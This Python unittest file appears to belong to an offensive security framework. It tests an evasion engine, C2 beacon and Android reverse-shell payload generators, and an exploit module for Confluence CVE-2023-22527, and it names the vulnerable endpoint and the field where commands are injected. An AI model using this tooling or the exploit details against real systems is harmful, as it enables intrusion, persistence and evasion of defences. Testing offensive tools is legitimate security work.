#!/usr/bin/env python3
"""
Tests for newly added components: CLI, Evasion, Beacon, Android, and Confluence Exploit.
"""

import unittest
from unittest.mock import patch, MagicMock
import argparse
import sys
import os

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, PROJECT_ROOT)

class TestCLI(unittest.TestCase):
    def test_parser(self):
        from cli.parser import create_advanced_parser
        parser = create_advanced_parser()
        self.assertIsInstance(parser, argparse.ArgumentParser)
        
        args = parser.parse_args(['-m', 'test_module', '-q'])
        self.assertEqual(args.module, 'test_module')
        self.assertTrue(args.quiet)

    def test_constants(self):
        from cli.utils import constants
        self.assertTrue(hasattr(constants, 'FRAMEWORK_VERSION'))
        self.assertTrue(hasattr(constants, 'BANNER'))

class TestEvasionEngine(unittest.TestCase):
    def setUp(self):
        from core.evasion_engine import EvasionEngine
        self.engine = EvasionEngine()

    def test_disabled_evasion(self):
        payload = "test payload"
        self.assertEqual(self.engine.apply_evasion(payload), payload)

    def test_enabled_obfuscation(self):
        self.engine.enabled = True
        payload = "test payload"
        result = self.engine.apply_evasion(payload, 'obfuscation')
        self.assertIn("Obfuscated", result)
        self.assertIn(payload, result)

    def test_enabled_syscalls(self):
        self.engine.enabled = True
        payload = "test payload"
        result = self.engine.apply_evasion(payload, 'syscalls')
        self.assertIn("Direct Syscalls", result)
        self.assertIn(payload, result)

class TestNewPayloads(unittest.TestCase):
    def test_beacon_https(self):
        from payloads.beacon import BeaconPayloads
        b = BeaconPayloads()
        payload = b.reverse_https('1.2.3.4', 4444)
        self.assertIn('https://1.2.3.4:4444', payload)
        self.assertIn('beacon_loop', payload)

    def test_beacon_dns(self):
        from payloads.beacon import BeaconPayloads
        b = BeaconPayloads()
        payload = b.dns_beacon('1.2.3.4', 53, {'domain': 'test.local'})
        self.assertIn('test.local', payload)
        self.assertIn('dns_beacon_loop', payload)

    def test_android_reverse_tcp(self):
        from payloads.android import AndroidPayloads
        a = AndroidPayloads()
        payload = a.reverse_tcp('1.2.3.4', 4444)
        self.assertIn('1.2.3.4', payload)
        self.assertIn('4444', payload)
        self.assertIn('socket', payload)

class TestConfluenceCVE(unittest.TestCase):
    def setUp(self):
        from exploits.confluence_cve_2023_22527 import ConfluenceRCEExploit
        self.exploit = ConfluenceRCEExploit()
        self.exploit.options['TARGET'] = {'value': 'http://target.local'}
        self.exploit.options['COMMAND'] = {'value': 'whoami'}

    @patch('requests.post')
    def test_check_vulnerable(self, mock_post):
        mock_resp = MagicMock()
        mock_resp.text = "something 1787569 something"
        mock_post.return_value = mock_resp

        result = self.exploit.check('http://target.local')
        self.assertTrue(result)
        mock_post.assert_called_once()
        args, kwargs = mock_post.call_args
        self.assertIn('/template/aui/text-inline.vm', args[0])
        self.assertIn('1337', kwargs['data']['label'])

    @patch('requests.post')
    def test_check_not_vulnerable(self, mock_post):
        mock_resp = MagicMock()
        mock_resp.text = "safe content"
        mock_post.return_value = mock_resp

        result = self.exploit.check('http://target.local')
        self.assertFalse(result)

    @patch('requests.post')
    def test_exploit_cmd(self, mock_post):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "root\n"
        mock_post.return_value = mock_resp

        self.exploit.options['PAYLOAD_TYPE'] = {'value': 'cmd'}
        result = self.exploit.exploit('http://target.local')
        self.assertTrue(result)
        mock_post.assert_called_once()
        args, kwargs = mock_post.call_args
        self.assertIn('whoami', kwargs['data']['label'])

    @patch('requests.post')
    def test_exploit_reverse_shell_missing_args(self, mock_post):
        self.exploit.options['PAYLOAD_TYPE'] = {'value': 'reverse_shell'}
        result = self.exploit.exploit('http://target.local')
        self.assertFalse(result) # Missing LHOST/LPORT
        mock_post.assert_not_called()

if __name__ == '__main__':
    unittest.main()
